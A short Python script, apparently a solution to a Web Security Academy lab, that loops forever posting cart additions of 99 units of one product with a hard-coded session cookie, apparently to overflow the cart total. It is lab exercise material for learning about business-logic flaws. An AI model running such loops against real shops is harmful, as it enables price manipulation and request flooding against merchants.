import requests

def main():
    url = "https://0aae00a4049df490c02fd29500930053.web-security-academy.net/cart"
    run = True
    i = 0
    while(run):
        r = requests.post(url, data={'productId':1,'redir':'CART','quantity':99}, cookies={'session':'Kjxn42jY96BTbuCixbPRt7iEgQM7Z1UX'})
        i += 1
        print(str(i) + ' - ' + str(r.status_code))

if __name__ == '__main__':
    main()